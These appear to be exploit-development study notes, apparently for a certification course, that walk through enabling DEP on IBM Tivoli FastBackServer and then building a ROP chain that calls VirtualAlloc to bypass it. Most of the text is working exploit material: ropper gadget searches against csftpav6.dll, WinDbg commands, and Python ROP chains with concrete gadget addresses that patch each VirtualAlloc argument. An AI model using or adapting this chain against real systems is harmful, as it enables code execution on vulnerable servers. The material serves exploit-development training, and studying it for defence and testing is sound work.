# Summary

## Turn on DEP

1. Navigate to **Windows Defender Security Center**
2. Select **App & Browser control**
3. Select **Exploit Protection Settings**
4. Select **Program Settings**
5. Click **Add program to customize**
6. Select **Choose exact file path**
7. **Navigate to** `C:\Program Files\Tivoli\TSM\FastBack\server` then select `FastBackServer.exe`
8. Under **Data Execution Prevention (DEP)** select **Override system settings** and **On**. Then click **Apply**
9. Restart the FastBackServer service

## Get the offset

## Locate Gadgets

```bash
# List all available modules
lm m FastBackServer
# Find a module without any bad characters
```

## Prepare Dummy Shellcode

<figure><img src="../../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

```python
# Example Dummy Shellcode
va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address
va += pack("<L", (0x46464646)) # dummy Shellcode Return Address
va += pack("<L", (0x47474747)) # dummy Shellcode Address
va += pack("<L", (0x48484848)) # dummy dwSize 
va += pack("<L", (0x49494949)) # dummy flAllocationType 
va += pack("<L", (0x51515151)) # dummy flProtect 

offset = b"A" * (276 - len(va))
```

## Get ESP address on the top of the stack

Get a copy of the address ESP points to on the stack. So initially this will be the address that points to the start of the shellcode (43434343). "MOV EAX, ESP ; RET" would be ideal but not likely found.&#x20;

{% code overflow="wrap" %}
```bash
ropper --file /home/kali/share/OSED/csftpav6.dll --search "push esp%pop%ret"
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

```
offset = b"A" * (276 - len(va))
eip = pack("<L", (0x50501110)) # push esp ; push eax ; pop edi; pop esi ; ret
rop = b"C" * (0x400 - 276 - 4)
```

## Get VirtualAlloc Address

### Procedure

1. Find the address of VirtualAlloc in the module
2. Find the address of the dummy DWORD (45454545)
3. Get the ESI Address into a register
4. Resolve the VirtualAlloc address on the stack
5. Overwrite the dummy DWORD (45454545) with the resolved VirtualAlloc address

### Finding VirtualAlloc in the module

<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

```bash
# Using the module file with no bad characters find the VirtualAlloc
ropper --file /home/kali/share/OSED/csftpav6.dll --imports | grep VirtualAlloc
```

### Finding address of dummy DWORD

In summary. We crash the application and find the offset to the **<45454545>** dummy DWORD.&#x20;

Crash the application with the usual AAAAA|BBBB|CCCCCCCC payload. Then use a command similar to the one below to find the exact offset.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
dd esp -1C
```
{% endcode %}

Ideal gadget is `sub esi, 0x1C` ; ret however this is probably not found. We could put 0x1C on the stack and then pop that into a register however 0x1C value is really 0x0000001C, which has NULL bytes in it. We get around this by using the negative value.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

```
? -0x1c
```

### Get the ESI Address into a register

Search for another gadget using `ropper`.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
ropper --file /home/kali/share/OSED/csftpav6.dll --search "mov ???, esi%ret" --badbytes 00090A0B0C0D20
```
{% endcode %}

Notice that the gadget contains a POP ESI instruction. This requires us to add a dummy DWORD on the stack for alignment.&#x20;

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

At this point, EAX contains the original address from ESP. Next, we have to pop the -0x1C value into ECX and add it to EAX. We can use a "POP ECX" instruction to get the negative value into ECX, followed by a gadget containing an "ADD EAX, ECX" instruction

<figure><img src="../../../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
ropper --file /home/kali/share/OSED/csftpav6.dll --search "pop ecx; ret;" --badbytes 00090A0B0C0D20
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
ropper --file /home/kali/share/OSED/csftpav6.dll --search "add eax, ecx; ret;" --badbytes 00090A0B0C0D20
```
{% endcode %}

We can now update the code as below.&#x20;

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

With the correct value in EAX, it needs to be copied back to ESI. So find a gadget to do this.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
ropper --file /home/kali/share/OSED/csftpav6.dll --search "push eax; pop esi; ret;" --badbytes 00090A0B0C0D20
```
{% endcode %}

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

IAT address for _VirtualAlloc_ is 0x5054A220, but we know 0x20 is a bad character for our exploit. To solve this, we can increase its address by one and then use a couple of gadgets to decrease it to the original value.

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
rop += pack("<L", (0x5054A221)) # VirtualAlloc IAT + 1
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffff)) # -1 into ecx
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051f278)) # mov eax, dword [eax] ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

### Patching the return address

At the end of the last run we had the address of dummy shellcode for VirtualAlloc (45454545) in the ESI register. To get the address for the dummy Shellcode Return Address (46464646) we can just increment the ESI register 4 times.&#x20;

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
rop += pack("<L", (0x5054A221)) # VirtualAlloc IAT + 1
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffff)) # -1 into ecx
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051f278)) # mov eax, dword [eax] ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

With ESI aligned we now need to get the shellcode address then reuse the "MOV DWORD \[ESI], EAX ; RET" gadget to patch the placeholder value. We can simply add a fixed value and add it to the value in ESI. However we need to retain ESI for patching the dummy memory address. So with the available gadgets what we are doing here is moving esi to eax then cloberring esi with junk. Then restoring esi. Then popping the arbitrary value into ecx (To be updated once wek now the actual offset). Then subtracting ecx from eax to get the value. Then we write the address to the dummy Shellcode Return Address (46464646) value.&#x20;

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xfffffdf0)) # -0x210
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

### Patching Arguments

_lpAddress_  # dummy Shellcode Address (47474747). Should be set to the same as the return address.  So we can just increment the ESI 4 times and the other gadgets we used previously. However the offset we use will be different as we increased ESI by 4 so we use -0x20c.&#x20;

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xfffffdf4)) # -0x20c
rop += pack("<L", (0x50533bf4)) # sub eax, ecx ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

_`dwSize #`_` ``dummy dwSize (48484848)`. First increment 4 times to get ESI to point to the correct address. Pop the value -1 into EAX then use the neg instruction to convert it to a positive value.&#x20;

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret 
rop += pack("<L", (0xffffffff)) # -1 value that is negated
rop += pack("<L", (0x50527840)) # neg eax ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

_`flAllocationType`_` ``# dummy flAllocationType  (49494949)`. Must be set to 0x1000. We could try to reuse the trick of negation but we notice that two's complement to 0x1000 is 0xfffff000, which also contains null bytes. Use the existing gadgets we found, which will allow us to pop arbitrary values into EAX and ECX and subsequently perform an addition of them.&#x20;

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret 
rop += pack("<L", (0x80808080)) # first value to be added
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0x7f7f8f80)) # second value to be added
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

`flProtect # dummy flProtect (51515151)`. Reuse the same technique done for `flAllocationType` .

```bash
0:063> ? 40 - 80808080
Evaluate expression: -2155905088 = ffffffff`7f7f7fc0

0:063> ? 80808080 + 7f7f7fc0
Evaluate expression: 4294967360 = 00000001`00000040
```

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret 
rop += pack("<L", (0x80808080)) # first value to be added
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0x7f7f7fc0)) # second value to be added
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x5051e4db)) # int3 ; push eax ; call esi
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```
